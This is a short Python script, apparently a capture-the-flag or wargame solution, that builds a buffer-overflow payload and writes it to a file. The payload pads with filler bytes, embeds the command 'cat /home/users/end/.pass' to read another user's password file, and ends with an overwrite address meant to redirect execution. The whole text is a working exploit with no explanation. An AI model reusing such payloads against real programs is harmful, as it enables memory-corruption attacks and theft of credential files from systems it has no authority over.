payload = b"b" * 40
payload += b"\xff"
payload += b"a" * 158
payload += b"cat /home/users/end/.pass"
payload += b" " * (128 - 25)
payload += b"\x8c\x48\x55\x55\x55\x55"

with open('payload', 'wb') as f:
    f.write(payload)